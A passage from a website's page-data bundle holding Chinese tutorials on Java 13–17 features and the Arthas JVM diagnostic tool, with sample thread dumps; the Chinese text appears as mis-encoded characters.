}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n\n# java13\n\n\n# ææ¬å\n\nå½æä»¬éè¦ä½¿ç¨å¤æå­ç¬¦ä¸²æ¶ï¼å¯è½å­ç¬¦ä¸²ä¸­åå«äºå¾å¤éè¦è½¬ç§»çå­ç¬¦ï¼æ¯å¦åå¼å·ç­ï¼è¿æ¶æä»¬å°±å¯ä»¥ä½¿ç¨ä¸å¼å·æ¥åæ¬å­ç¬¦ä¸²\n\n    public static void main(string[] args) throws urisyntaxexception, ioexception, interruptedexception {\n        var s = """\n                    dsafdsafdsa\n                        dfdsafd\n                            ""fdsa \\n \\n dsfdsa\n                            \\r ffff \\t dsfad \n                """;\n        system.out.println(s);\n    }\n\nç»ææå°ï¼\n    dsafdsafdsa\n        dfdsafd\n            ""fdsa \n \n dsfdsa\n ffff \t dsfad\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# java14\n\n\n# æ°ç instanceof è¯­æ³\n\n    public boolean old(object o) {\n        if (this == o) {return true;}\n        if (o instanceof user) {\n            user user = (user) o;\n            return user.name.equals(this.name);\n        }\n        return false;\n    }\n\n    public boolean java16(object o) {\n        if (this == o) {return true;}\n        if (o instanceof user user) {\n            return user.name.equals(this.name);\n        }\n        return false;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# ç©ºæéå¼å¸¸çæ¹è¿\n\nå¨æ§çæ¬ä¸­å¦æåºç°ç©ºæéå¼å¸¸ï¼æ¥éåªä¼ç»æä»¬ç©ºæéåçå¨åªä¸è¡ï¼å·ä½åªä¸ªåéä¸ºç©ºå¹¶ä¸ä¼åè¯æä»¬ï¼éè¦æä»¬èªå·±æ debugï¼å¨æ°ççæ¬ä¸­ä¼æç¡®åç¥æä»¬ã\n\n\n# è®°å½ç±»å record\n\nç»§ç±»ãæ¥å£ãæä¸¾ãæ³¨è§£ä¹åçåä¸æ°ç±»åæ¥äºï¼ä»çåå­å« è®°å½ ï¼å¨ java14 ä¸­é¦æ¬¡åºåºï¼è¿ä¸åºåºï¼lombok çå©æ¢¦æ¥äºã å¨å®éå¼åä¸­ï¼å¾å¤ç±»ä»ä»åªæ¯åå½ä¸ä¸ªå®ä½ç±»ç½¢äºï¼ä¿å­çæ¯ä¸äºä¸å¯åæ°æ®ï¼æ¯å¦æä»¬ä»æ°æ®åºä¸­æ¥è¯¢çè´¦æ·ä¿¡æ¯ï¼æåè¢«æ å°ä¸ºä¸ä¸ªå®ä½ç±»\n\n@data\npublic class user {\n\n    private string name;\n  \n    private integer age;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nlombok å¯ä»¥è¯´æ¶ç®åä»£ç çç¥å¨ï¼å®è½å¨ç¼è¯æ¶èªå¨çæ getãsetãæé å¨ãtostring () æ¹æ³ç­ï¼å¨ç¼åè¿äºå®ä½ç±»æ¶ï¼ç®ç´ä¸è¦å¤ªå¥½ç¨ï¼record å¯ä»¥è®©æä»¬ä¸éè¦æ¾å¼å°å®ä¹æé å½æ°ãgetters æ¹æ³æ equals å hashcode æ¹æ³ãææè¿äºé½ä¼ç± records èªå¨çæã\n\nè®°å½ç±»åæ¬è´¨ä¸ä¹æ¯ä¸ä¸ªæ®éç±»ï¼ä¸è¿æ¯ final ç±»åä¸ç»§æ¿èª java.lang.record æ½è±¡ç±»çï¼ä»ä¼å¨ç¼è¯æ¶ï¼ä¼èªå¨ç¼è¯åº getãhashcodeãequalsãtostring ç­æ¹æ³ã\n\n// åªè½æå­æ®µåéæ¬å·ä¸­\npublic record user(string name,integer age) {\n    public static void a(){\n    }\n    public static void main(string[] args) {\n        user user = new user("å¼ ä¸",2);\n        system.out.println(user.name());\n        system.out.println(user);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nä½æäºåè½è¿æ¯æ²¡æåæ³ä¸ lombok ç¸æ¯çï¼å¦ @sl4jï¼é¾å¼è°ç¨ï¼æ åæé å½æ°ä¸æ¯æç­ã\n\n\n# java17\n\n\n# å¯å°ç±»å\n\nå¯å°ç±»åå¯ä»¥è¯´æ¶ java17 æ­£å¼æ¨åºçåä¸éç£ç±»åï¼å®å¨ java15 é¦æ¬¡æåºå¹¶æµè¯äºä¸¤ä¸ªçæ¬ã\n\nå¨ java ä¸­ï¼æä»¬å¯ä»¥éè¿ç»§æ¿ï¼extends å³é®å­ï¼æ¥å®ç°ç±»çè½åå¤ç¨ï¼æ©å±ä¸å¢å¼ºãä½æçæ¶åï¼å¯è½å¹¶ä¸æ¯ææçç±»æä»¬é½å¸æè½å¤è¢«ç»§æ¿ãæä»¥ï¼æä»¬éè¦å¯¹ç»§æ¿å³ç³»æä¸äºéå¶çæ§å¶ææ®µï¼èå¯å°ç±»çä½ç¨å°±æ¯éå¶ç±»çç»§æ¿ãå®éä¸å¨ä¹åæä»¬å¦æä¸å¸æå«äººç»§æ¿æä»¬çç±»ï¼å¯ä»¥ç´æ¥æ·»å  final å³é®å­ã\n\nè¿æ ·æä¸ä¸ªç¼ºç¹ï¼å¦ææ·»å äº final å³é®å­ï¼é£ä¹æ è®ºæ¯è°ï¼åæ¬æä»¬èªå·±ä¹æ¯æ²¡åæ³å®ç°ç»§æ¿çï¼ä½æ¯ç°å¨æä»¬æä¸ä¸ªéæ±ï¼åªåè®¸æä»¬èªå·±åçç±»ç»§æ¿ï¼ä½æ¯ä¸åè®¸å«äººåçç±»ç»§æ¿ï¼è¿æ¶è¯¥ååï¼å¨ java17 ä¹åæ³è¦å®ç°å°±å¾éº»ç¦ã\n\n# æ§çæ¬\npublic final class a{\n}\n\n# æ°çæ¬ sealed\npublic sealed class a permits b {\n}\n# ç»§æ¿ a\npublic final class b extends a {\n}\npublic sealed class b extends a {\n}\npublic non-sealed b extends a {\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nå¯å°ç±»åæä»¥ä¸è¦æ±ï¼\n\n * å¯ä»¥åºäºæ®éç±»ãæ½è±¡ç±»ãæ¥å£ï¼ä¹å¯ä»¥ç»§æ¿èªå¶ä»æ¥å£çå­ç±»ææ¯å®ç°å¶ä»æ¥å£çç±»ç­ã\n * å¿é¡»æå­ç±»ç»§æ¿ï¼ä¸ä¸è½æ¯å¿ååé¨ç±»ææ¯ lambda çå½¢å¼\n * sealed åå¨åæ¥ final çä½ç½®ï¼ä½ä¸è½å finalãnon-sealed å³é®å­åæ¶åºç°ï¼åªè½éå¶ä¸\n * ç»§æ¿çå­ç±»å¿é¡»æ¾ç¤ºçæ è®°ä¸º finalï¼è¡¨ç¤ºè¿ä¸ªç±»ä¸è½è¢«ç»§æ¿ï¼ãsealedï¼è¡¨ç¤ºè¿ä¸ªå­ç±»ä¹å¯ä»¥æå¶ä»å¯å°çæéå¯å°çå­ç±»ï¼ ææ¯ non-sealed ï¼è¡¨ç¤ºè¿ä¸ªå­ç±»ä¸è½æå­ç±»ï¼ä½å®å¯ä»¥è¢«å¶ä»ç±»ç»§æ¿ï¼ç±»å',charsets:{cjk:!0}},{title:"JVM æ¨¡åä»ç»",frontmatter:{title:"JVM æ¨¡åä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/language/cj/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/02.%E4%BB%93%E9%A2%89/01.%E5%9F%BA%E7%A1%80/1.%E4%BB%93%E9%A2%89.html",relativePath:"00.è¯­è¨/02.ä»é¢/01.åºç¡/1.ä»é¢.md",key:"v-747c7e31",path:"/language/cj/1/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:"",normalizedContent:"",charsets:{}},{title:"Alibaba Arthas",frontmatter:{title:"Alibaba Arthas",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/other/4/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/04.%E5%85%B6%E4%BB%96/4.Alibaba%20Arthas.html",relativePath:"00.è¯­è¨/01.JAVA/04.å¶ä»/4.Alibaba Arthas.md",key:"v-1b2fbd05",path:"/language/java/other/4/",headers:[{level:2,title:"Arthas æ¯ä»ä¹ï¼",slug:"arthas-æ¯ä»ä¹",normalizedTitle:"arthas æ¯ä»ä¹ï¼",charIndex:2},{level:2,title:"è¿éååºä¸äºå¸¸ç¨å½ä»¤å¹¶ä¸ä¸è®²è§£",slug:"è¿éååºä¸äºå¸¸ç¨å½ä»¤å¹¶ä¸ä¸è®²è§£",normalizedTitle:"è¿éååºä¸äºå¸¸ç¨å½ä»¤å¹¶ä¸ä¸è®²è§£",charIndex:156},{level:2,title:"dashboard",slug:"dashboard",normalizedTitle:"dashboard",charIndex:180},{level:2,title:"thread",slug:"thread",normalizedTitle:"thread",charIndex:190},{level:2,title:"jvm",slug:"jvm",normalizedTitle:"jvm",charIndex:56},{level:2,title:"sc",slug:"sc",normalizedTitle:"sc",charIndex:201},{level:2,title:"sm",slug:"sm",normalizedTitle:"sm",charIndex:204},{level:2,title:"jad",slug:"jad",normalizedTitle:"jad",charIndex:207},{level:2,title:"mc",slug:"mc",normalizedTitle:"mc",charIndex:211},{level:2,title:"redefine",slug:"redefine",normalizedTitle:"redefine",charIndex:214},{level:2,title:"monitor",slug:"monitor",normalizedTitle:"monitor",charIndex:223},{level:2,title:"watch",slug:"watch",normalizedTitle:"watch",charIndex:231}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Arthas æ¯ä»ä¹ï¼ è¿éååºä¸äºå¸¸ç¨å½ä»¤å¹¶ä¸ä¸è®²è§£ dashboard thread jvm sc sm jad mc redefine monitor watch",content:'# Arthas æ¯ä»ä¹ï¼\n\nArthas æ¯ Alibaba å¼åå¾ä¸æ¬¾ java è¯æ­å·¥å·ï¼å¯ä»¥å¸®æä»¬æ¥ç jvm ä½¿ç¨æåµï¼æ¥ççº¿ç¨æ°ï¼æé¤é»å¡çº¿ç¨ï¼çå¬ç±»åæ¹æ³å¾è°ç¨æ¬¡æ°ï¼å¤±è´¥æ¬¡æ° (å¤±è´¥ç)ï¼æ§è¡æ¶å¸¸ï¼çå¬æ¹æ³å¾å¥åï¼åºåï¼å¼å¸¸ä¿¡æ¯ï¼å¿«éåç¼è¯æ¥çæºç ï¼å¹¶ä¿®æ¹æºç ï¼ç¼è¯è¿è¡ï¼æ¥çå æ ä¿¡æ¯ç­ã\n\n\n# è¿éååºä¸äºå¸¸ç¨å½ä»¤å¹¶ä¸ä¸è®²è§£\n\næå¸¸ç¨å¾å½ä»¤ï¼dashboardï¼threadï¼jvmï¼scï¼smï¼jadï¼mcï¼redefineï¼monitorï¼watchãå®æ¹å°åï¼https://arthas.aliyun.com/\n\n\n# dashboard\n\n\n\ndashboard å½åç³»ç»çå®æ¶æ°æ®é¢æ¿ï¼æ ctrl+c éåºï¼å½è¿è¡å¨ Ali-tomcat æ¶ï¼ä¼æ¾ç¤ºå½å tomcat çå®æ¶ä¿¡æ¯ï¼å¦ HTTP è¯·æ±ç qps, rt, éè¯¯æ°ï¼çº¿ç¨æ± ä¿¡æ¯ç­ç­ã\næ°æ®è¯´æå¦ä¸ï¼\n\n * ID: Java çº§å«ççº¿ç¨ IDï¼æ³¨æè¿ä¸ª ID ä¸è½è· jstack ä¸­ç nativeID ä¸ä¸å¯¹åº\n * NAME: çº¿ç¨å\n * GROUP: çº¿ç¨ç»å\n * PRIORITY: çº¿ç¨ä¼åçº§ï¼1~10 ä¹é´çæ°å­ï¼è¶å¤§è¡¨ç¤ºä¼åçº§è¶é«\n * STATE: çº¿ç¨çç¶æ\n * CPU%: çº¿ç¨æ¶èç cpu å æ¯ï¼éæ · 100msï¼å°ææçº¿ç¨å¨è¿ 100ms åç cpu ä½¿ç¨éæ±åï¼åç®åºæ¯ä¸ªçº¿ç¨ç cpu ä½¿ç¨å æ¯ã\n * TIME: çº¿ç¨è¿è¡æ»æ¶é´ï¼æ°æ®æ ¼å¼ä¸º åï¼ç§\n * INTERRUPTED: çº¿ç¨å½åçä¸­æ­ä½ç¶æ\n * DAEMON: æ¯å¦æ¯å®æ¤çº¿ç¨\n\n\n# thread\n\næ¥çå½åçº¿ç¨ä¿¡æ¯ï¼æ¥ççº¿ç¨çå æ \nç¤ºä¾ï¼ thread -n 3 æ¾åºå 3 ä¸ªçº¿ç¨çå æ ä¿¡æ¯\n\n * id çº¿ç¨ id;\n * -n æå®æå¿çå N ä¸ªçº¿ç¨å¹¶æå°å æ ï¼\n * -b æ¾åºå½åé»å¡å¶ä»çº¿ç¨ççº¿ç¨ï¼\n * -i <value> æå® cpu å æ¯ç»è®¡çéæ ·é´éåä½ä¸ºæ¯«ç§ï¼å»ºè®® 5000\n\n$ thread -n 3\n"as-command-execute-daemon" Id=58 cpuUsage=76% RUNNABLE\n    at java.management@12.0.1/sun.management.ThreadImpl.dumpThreads0(Native Method)\n    at java.management@12.0.1/sun.management.ThreadImpl.getThreadInfo(ThreadImpl.java:466)\n    at com.taobao.arthas.core.command.monitor200.ThreadCommand.processTopBusyThreads(ThreadCommand.java:133)\n    at com.taobao.arthas.core.command.monitor200.ThreadCommand.process(ThreadCommand.java:79)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl.process(AnnotatedCommandImpl.java:82)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl.access$100(AnnotatedCommandImpl.java:18)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl$ProcessHandler.handle(AnnotatedCommandImpl.java:111)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl$ProcessHandler.handle(AnnotatedCommandImpl.java:108)\n    at com.taobao.arthas.core.shell.system.impl.ProcessImpl$CommandProcessTask.run(ProcessImpl.java:370)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)\n    at java.base@12.0.1/java.lang.Thread.run(Thread.java:835)\n\n    Number of locked synchronizers = 1\n    - java.util.concurrent.ThreadPoolExecutor$Worker@7808db3c\n\n\n"NioBlockingSelector.BlockPoller-1" Id=24 cpuUsage=17% RUNNABLE (in native)\n    at java.base@12.0.1/sun.nio.ch.EPoll.wait(Native Method)\n    at java.base@12.0.1/sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:120)\n    at java.base@12.0.1/sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:124)\n    -  locked sun.nio.ch.Util$2@1a574b17\n    -  locked sun.nio.ch.EPollSelectorImpl@7b0d44f5\n    at java.base@12.0.1/sun.nio.ch.SelectorImpl.select(SelectorImpl.java:136)\n    at org.apache.tomcat.util.net.NioBlockingSelector$BlockPoller.run(NioBlockingSelector.java:304)\n\n\n"http-nio-8087-ClientPoller-1" Id=36 cpuUsage=5% RUNNABLE (in native)\n    at java.base@12.0.1/sun.nio.ch.EPoll.wait(Native Method)\n    at java.base@12.0.1/sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:120)\n    at java.base@12.0.1/sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:124)\n    -  locked sun.nio.ch.Util$2@703ba4c0\n    -  locked sun.nio.ch.EPollSelectorImpl@6a6a92bd\n    at java.base@12.0.1/sun.nio.ch.SelectorImpl.select(SelectorImpl.java:136)\n    at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:743)\n    at java.base@12.0.1/java.lang.Thread.run(Thread.java:835)\n\n\nAffect(row-cnt:0) cost in 131 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\nç¤ºä¾ï¼thread æåºææè¿è¡çº¿ç¨\n\n$ thread\nThreads Total: 37, NEW: 0, RUNNABLE: 14, BLOCKED: 0, WAITING: 17, TIMED_WAITING: 6, TERMINATED: 0                                                                                                                                       \nID                 NAME                                                      GROUP                                  PRIORITY           STATE               %CPU               TIME               INTERRUPTED         DAEMON             \n59                 as-command-execute-daemon                                 system                                 10                 RUNNABLE            100                0:0                false               true               \n42                 AsyncAppender-Worker-arthas-cache.result.AsyncAppender    system                                 9                  WAITING             0                  0:0                false               true               \n40                 Attach Listener                                           system                                 9                  RUNNABLE            0                  0:0                false               true               \n14                 Catalina-utility-1                                        main                                   1                  WAITING             0                  0:1                false               false              \n15                 Catalina-utility-2                                        main                                   1                  TIMED_WAITING       0                  0:0                false               false              \n10                 Common-Cleaner                                            InnocuousThreadGroup                   8                  TIMED_WAITING       0                  0:0                false               true               \n39                 DestroyJavaVM                                             main                                   5                  RUNNABLE            0                  0:12               false               false              \n3                  Finalizer                                                 system                                 8                  WAITING             0                  0:0                false               true               \n19                 MQTT Call: mqttId_inbound                                 main                                   5                  WAITING             0                  0:0                false               false              \n23                 MQTT Ping: mqttId_inbound                                 main                                   5                  TIMED_WAITING       0                  0:0                false               false              \n20                 MQTT Rec: mqttId_inbound                                  main                                   5                  RUNNABLE            0                  0:0                false               false              \n21                 MQTT Snd: mqttId_inbound                                  main                                   5                  WAITING             0                  0:0                false               false              \n24                 NioBlockingSelector.BlockPoller-1                         main                                   5                  RUNNABLE            0                  0:0                false               true               \n2                  Reference Handler                                         system                                 10                 RUNNABLE            0                  0:0                false               true               \n4                  Signal Dispatcher                                         system                                 9                  RUNNABLE            0                  0:0                false               true               \n16                 container-0                                               main                                   5                  TIMED_WAITING       0                  0:0                false               false              \n37                 http-nio-8087-Acceptor-0                                  main                                   5                  RUNNABLE            0                  0:0                false               true               \n35                 http-nio-8087-ClientPoller-0                              main                                   5                  RUNNABLE            0                  0:0                false               true               \n36                 http-nio-8087-ClientPoller-1                              main                                   5                  RUNNABLE            0                  0:0                false               true               \n25                 http-nio-8087-exec-1                                      main                                   5                  WAITING             0                  0:0                false               true               \n34                 http-nio-8087-exec-10                                     main                                   5                  WAITING             0                  0:0                false               true               \n26                 http-nio-8087-exec-2                                      main                                   5                  WAITING             0                  0:0                false               true               \n27                 http-nio-8087-exec-3                                      main                                   5                  WAITING             0                  0:0                false               true               \n28                 http-nio-8087-exec-4                                      main                                   5                  WAITING             0                  0:0                false               true               \n29                 http-nio-8087-exec-5                                      main                                   5                  WAITING             0                  0:0                false               true               \n30                 http-nio-8087-exec-6                                      main                                   5                  WAITING             0                  0:0                false               true               \n31                 http-nio-8087-exec-7                                      main                                   5                  WAITING             0                  0:0                false               true               \n32                 http-nio-8087-exec-8                                      main                                   5                  WAITING             0                  0:0                false               true               \n33                 http-nio-8087-exec-9                                      main                                   5                  WAITING             0                  0:0                false               true               \n44                 job-timeout                                               system                                 9                  TIMED_WAITING       0                  0:0                false               true               \n45                 nioEventLoopGroup-2-1                                     system                                 10                 RUNNABLE            0                  0:0                false               false              \n49                 nioEventLoopGroup-2-2                                     system                                 10                 RUNNABLE            0                  0:1                false               false              \n53                 nioEventLoopGroup-2-3                                     system                                 10                 RUNNABLE            0                  0:0                false               false              \n46                 nioEventLoopGroup-3-1                                     system                                 10                 RUNNABLE            0                  0:0                false               false              \n22                 pool-2-thread-4                                           main                                   5                  WAITING             0                  0:0                false               false              \n47                 pool-3-thread-1                                           system                                 5                  TIMED_WAITING       0                  0:0                false               false              \n48                 pool-4-thread-1                                           system                                 5                  WAITING             0                  0:0                false               false              \nAffect(row-cnt:0) cost in 113 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\nç¤ºä¾ï¼thread 20 æ¥ççº¿ç¨ id ä¸º 20 çå æ ä¿¡æ¯\n\n$ thread 20\n"MQTT Rec: mqttId_inbound" Id=20 RUNNABLE (in native)\n    at java.base@12.0.1/java.net.SocketInputStream.socketRead0(Native Method)\n    at java.base@12.0.1/java.net.SocketInputStream.socketRead(SocketInputStream.java:115)\n    at java.base@12.0.1/java.net.SocketInputStream.read(SocketInputStream.java:168)\n    at java.base@12.0.1/java.net.SocketInputStream.read(SocketInputStream.java:140)\n    at java.base@12.0.1/java.net.SocketInputStream.read(SocketInputStream.java:200)\n    at java.base@12.0.1/java.io.DataInputStream.readByte(DataInputStream.java:270)\n    at org.eclipse.paho.client.mqttv3.internal.wire.MqttInputStream.readMqttWireMessage(MqttInputStream.java:92)\n    at org.eclipse.paho.client.mqttv3.internal.CommsReceiver.run(CommsReceiver.java:133)\n    at java.base@12.0.1/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)\n    at java.base@12.0.1/java.util.concurrent.FutureTask.run(FutureTask.java:264)\n    at java.base@12.0.1/java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:304)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)\n    at java.base@12.0.1/java.lang.Thread.run(Thread.java:835)\n\n    Number of locked synchronizers = 1\n    - java.util.concurrent.ThreadPoolExecutor$Worker@79cf8c25\n\nAffect(row-cnt:0) cost in 33 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nç¤ºä¾ï¼thread -b æ¾åºé»å¡å¶ä»çº¿ç¨ççº¿ç¨\n\n$ thread -b\nNo most blocking thread found!\nAffect(row-cnt:0) cost in 43 ms.\n\n\n1\n2\n3\n\n\nç¤ºä¾ï¼thread -n 3 -i 5000 é»å¡æå® 5 ç§åæ¶å°å 3 çº¿ç¨çå æ ä¿¡æ¯\n\n$ thread -n 3  -i 5000\n"Catalina-utility-1" Id=14 cpuUsage=21% TIMED_WAITING on java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject@72b49c8\n    at java.base@12.0.1/jdk.internal.misc.Unsafe.park(Native Method)\n    -  waiting on java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject@72b49c8\n    at java.base@12.0.1/java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:235)\n    at java.base@12.0.1/java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2123)\n    at java.base@12.0.1/java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1182)\n    at java.base@12.0.1/java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:899)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1054)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1114)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)\n    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\n    at java.base@12.0.1/java.lang.Thread.run(Thread.java:835)\n\n\n"http-nio-8087-ClientPoller-1" Id=36 cpuUsage=14% RUNNABLE (in native)\n    at java.base@12.0.1/sun.nio.ch.EPoll.wait(Native Method)\n    at java.base@12.0.1/sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:120)\n    at java.base@12.0.1/sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:124)\n    -  locked sun.nio.ch.Util$2@703ba4c0\n    -  locked sun.nio.ch.EPollSelectorImpl@6a6a92bd\n    at java.base@12.0.1/sun.nio.ch.SelectorImpl.select(SelectorImpl.java:136)\n    at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:743)\n    at java.base@12.0.1/java.lang.Thread.run(Thread.java:835)\n\n\n"as-command-execute-daemon" Id=62 cpuUsage=10% RUNNABLE\n    at java.management@12.0.1/sun.management.ThreadImpl.dumpThreads0(Native Method)\n    at java.management@12.0.1/sun.management.ThreadImpl.getThreadInfo(ThreadImpl.java:466)\n    at com.taobao.arthas.core.command.monitor200.ThreadCommand.processTopBusyThreads(ThreadCommand.java:133)\n    at com.taobao.arthas.core.command.monitor200.ThreadCommand.process(ThreadCommand.java:79)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl.process(AnnotatedCommandImpl.java:82)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl.access$100(AnnotatedCommandImpl.java:18)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl$ProcessHandler.handle(AnnotatedCommandImpl.java:111)\n    at com.taobao.arthas.core.shell.command.impl.AnnotatedCommandImpl$ProcessHandler.handle(AnnotatedCommandImpl.java:108)\n    at com.taobao.arthas.core.shell.system.impl.ProcessImpl$CommandProcessTask.run(ProcessImpl.java:370)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)\n    at java.base@12.0.1/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)\n    at java.base@12.0.1/java.lang.Thread.run(Thread.java:835)\n\n    Number of locked synchronizers = 1\n    - java.util.concurrent.ThreadPoolExecutor$Worker@2d2909be\n\n\nAffect(row-cnt:0) cost in 5045 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# jvm\n\næ¥çå½å JVM ä¿¡æ¯ï¼è¿éåªæ¿é¨åä¿¡æ¯æ¥è¯´\n\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n THREAD                                                                                                                                                                                                                                 \n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n COUNT                                                             37                                                                                                                                                                   \n DAEMON-COUNT                                                      22                                                                                                                                                                   \n PEAK-COUNT                                                        38                                                                                                                                                                   \n STARTED-COUNT                                                     55                                                                                                                                                                   \n DEADLOCK-COUNT                                                    0                                                                                                                                                                    \n                                                                                                                                                                                                                                        \n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n FILE-DESCRIPTOR                                                                                                                                                                                                                        \n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n MAX-FILE-DESCRIPTOR-COUNT                                         -1                                                                                                                                                                   \n OPEN-FILE-DESCRIPTOR-COUNT                                        -1         \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nTHREAD ç¸å³\n\n * COUNT: JVM å½åæ´»è·ççº¿ç¨æ°\n * DAEMON-COUNT: JVM å½åæ´»è·çå®æ¤çº¿ç¨æ°\n * PEAK-COUNT: ä» JVM å¯å¨å¼å§æ¾ç»æ´»ççæå¤§çº¿ç¨æ°\n * STARTED-COUNT: ä» JVM å¯å¨å¼å§æ»å±å¯å¨è¿ççº¿ç¨æ¬¡æ°\n * DEADLOCK-COUNT: JVM å½åæ­»éççº¿ç¨æ°\n\nFILE-DESCRIPTOR ç¸å³\n\n * MAX-FILE-DESCRIPTOR-COUNTï¼JVM è¿ç¨æå¤§å¯ä»¥æå¼çæä»¶æè¿°ç¬¦æ°\n * OPEN-FILE-DESCRIPTOR-COUNTï¼JVM å½åæå¼çæä»¶æè¿°ç¬¦æ°\n\n\n# sc\n\næ¥ç JVM å·²å è½½çç±»ä¿¡æ¯ï¼\nåæ°è¯´æï¼lassï¼åå + ç±»åï¼ï¼methodï¼æ¹æ³åï¼ï¼[d]ï¼è¾åºè¯¦ç»ä¿¡æ¯ï¼ï¼[E]ï¼å¼å¯æ­£åè¡¨è¾¾å¼å¹éï¼é»è®¤ä¸ºééç¬¦å¹éï¼ï¼[f]ï¼è¾åºå½åç±»çæååéä¿¡æ¯ï¼éè¦éååæ° - d ä¸èµ·ä½¿ç¨ï¼ï¼ï¼[x:]ï¼æå®è¾åºéæåéæ¶å±æ§çéåæ·±åº¦ï¼é»è®¤ä¸º 0ï¼å³ç´æ¥ä½¿ç¨ toString è¾åºï¼\nclass-pattern æ¯æå¨éå®åï¼å¦ com.taobao.test.AAAï¼ä¹æ¯æ com/taobao/test/AAA è¿æ ·çæ ¼å¼ï¼è¿æ ·ï¼æä»¬ä»å¼å¸¸å æ éé¢æç±»åæ·è´è¿æ¥çæ¶åï¼ä¸éè¦å¨æå¨æ / æ¿æ¢ä¸ºãå¦ã\nç¤ºä¾ï¼sc com.cloud*\n\n$ sc 